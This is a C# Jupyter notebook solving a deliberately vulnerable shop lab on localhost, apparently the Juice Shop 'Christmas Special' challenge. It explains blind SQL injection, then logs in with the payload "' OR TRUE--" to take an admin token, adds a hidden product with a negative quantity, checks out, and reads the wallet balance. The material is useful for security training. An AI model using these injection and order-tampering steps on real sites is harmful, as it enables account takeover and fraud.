{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Christmas Special\n",
    "\n",
    "## Order the Christmas special offer of 2014.\n",
    "Blind SQL (Structured Query Language) injection is a type of SQL Injection attack that asks the database true or false questions and determines the answer based on the applications response. This attack is often used when the web application is configured to show generic error messages, but has not mitigated the code that is vulnerable to SQL injection.\n",
    "\n",
    "When an attacker exploits SQL injection, sometimes the web application displays error messages from the database complaining that the SQL Query's syntax is incorrect. Blind SQL injection is nearly identical to normal SQL Injection, the only difference being the way the data is retrieved from the database. When the database does not output data to the web page, an attacker is forced to steal data by asking the database a series of true or false questions. This makes exploiting the SQL Injection vulnerability more difficult, but not impossible."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "dotnet_interactive": {
     "language": "csharp"
    }
   },
   "outputs": [],
   "source": [
    "#r \"nuget: System.Net.Http.Json, *-*\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "dotnet_interactive": {
     "language": "csharp"
    }
   },
   "outputs": [],
   "source": [
    "using System.Net.Http;\n",
    "using System.Net.Http.Json;\n",
    "using System.Net.Http.Headers;\n",
    "\n",
    "const string BASE_URL = \"http://localhost:3000/\";\n",
    "var BASE_URI = new Uri(BASE_URL); "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 2. Login as an authenticated user\n",
    "Using a sql injection pattern to authenticate as the administrative account "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "dotnet_interactive": {
     "language": "javascript"
    }
   },
   "outputs": [],
   "source": [
    "#!value --name json\n",
    "{\n",
    "    \"email\": \"' OR TRUE--\",\n",
    "    \"password\": \"12345\"\n",
    "}"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "dotnet_interactive": {
     "language": "csharp"
    }
   },
   "outputs": [],
   "source": [
    "#!share json --from value\n",
    "\n",
    "public struct AuthenticationToken {\n",
    "    public Authentication Authentication {get;set;}\n",
    "}\n",
    "\n",
    "public struct Authentication {\n",
    "    public string Token { get;set; }\n",
    "    public int Bid { get;set; }\n",
    "    public string Umail { get;set; }\n",
    "}\n",
    "\n",
    "var authenticationToken = string.Empty;\n",
    "\n",
    "using(var client = new HttpClient()) {\n",
    "    var content = new StringContent(json, Encoding.UTF8, \"application/json\");\n",
    "    var uri = new Uri(BASE_URI, \"rest/user/login\");\n",
    "    var response = await client.PostAsync(uri, content);\n",
    "    response.EnsureSuccessStatusCode();\n",
    "\n",
    "    var actualtoken = await response.Content.ReadFromJsonAsync<AuthenticationToken>();\n",
    "    authenticationToken = actualtoken.Authentication.Token;\n",
    "}"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 3. Add the secret product to the basket\n",
    "After having identified the secret product as ProductId: 10, populate the basket with one item of the product"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "dotnet_interactive": {
     "language": "javascript"
    }
   },
   "outputs": [],
   "source": [
    "#!value --name productJson\n",
    "{\n",
    "    \"ProductId\": 10,\n",
    "    \"BasketId\": \"1\",\n",
    "    \"quantity\": -10\n",
    "}"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "dotnet_interactive": {
     "language": "csharp"
    }
   },
   "outputs": [],
   "source": [
    "#!share productJson --from value\n",
    "\n",
    "using(var client = new HttpClient()) {\n",
    "    \n",
    "    var request = new HttpRequestMessage \n",
    "    {\n",
    "        Method = HttpMethod.Post,\n",
    "        Content = new StringContent(productJson, Encoding.UTF8, \"application/json\"),\n",
    "        RequestUri = new Uri(BASE_URI, \"api/BasketItems/\")\n",
    "    };\n",
    "\n",
    "    request.Headers.Authorization = new AuthenticationHeaderValue(\"Bearer\", authenticationToken);\n",
    "    var response = await client.SendAsync(request);\n",
    "    Console.WriteLine(response.StatusCode);\n",
    "}"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 4. Do checkout\n",
    "Checkout the basket by providing the appropriate information for address, payment and delivery"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "dotnet_interactive": {
     "language": "javascript"
    }
   },
   "outputs": [],
   "source": [
    "#!value --name checkoutJson\n",
    "{\n",
    "    \"couponData\":\"bnVsbA==\",\n",
    "    \"orderDetails\":{\n",
    "        \"paymentId\":\"3\",\n",
    "        \"addressId\":\"3\",\n",
    "        \"deliveryMethodId\":\"1\"\n",
    "    }\n",
    "}"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "dotnet_interactive": {
     "language": "csharp"
    }
   },
   "outputs": [],
   "source": [
    "#!share checkoutJson --from value\n",
    "\n",
    "using(var client = new HttpClient()) {\n",
    "    \n",
    "    var request = new HttpRequestMessage\n",
    "    {\n",
    "        Method = HttpMethod.Post,\n",
    "        Content = new StringContent(checkoutJson, Encoding.UTF8, \"application/json\"),\n",
    "        RequestUri = new Uri(BASE_URI, \"rest/basket/1/checkout\")\n",
    "    };\n",
    "\n",
    "    request.Headers.Authorization = new AuthenticationHeaderValue(\"Bearer\", authenticationToken);\n",
    "    var response = await client.SendAsync(request);\n",
    "    Console.WriteLine(response.StatusCode);\n",
    "}"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "dotnet_interactive": {
     "language": "csharp"
    }
   },
   "outputs": [],
   "source": [
    "using(var client = new HttpClient()) {\n",
    "    var request = new HttpRequestMessage\n",
    "    {\n",
    "        Method = HttpMethod.Get,\n",
    "        RequestUri = new Uri(BASE_URI, \"rest/wallet/balance\")\n",
    "    };\n",
    "\n",
    "    request.Headers.Authorization = new AuthenticationHeaderValue(\"Bearer\", authenticationToken);\n",
    "    var response = await client.SendAsync(request);\n",
    "\n",
    "    Console.WriteLine(await response.Content.ReadAsStringAsync());\n",
    "}"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".NET (C#)",
   "language": "C#",
   "name": ".net-csharp"
  },
  "language_info": {
   "file_extension": ".cs",
   "mimetype": "text/x-csharp",
   "name": "C#",
   "pygments_lexer": "csharp",
   "version": "9.0"
  },
  "orig_nbformat": 4
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
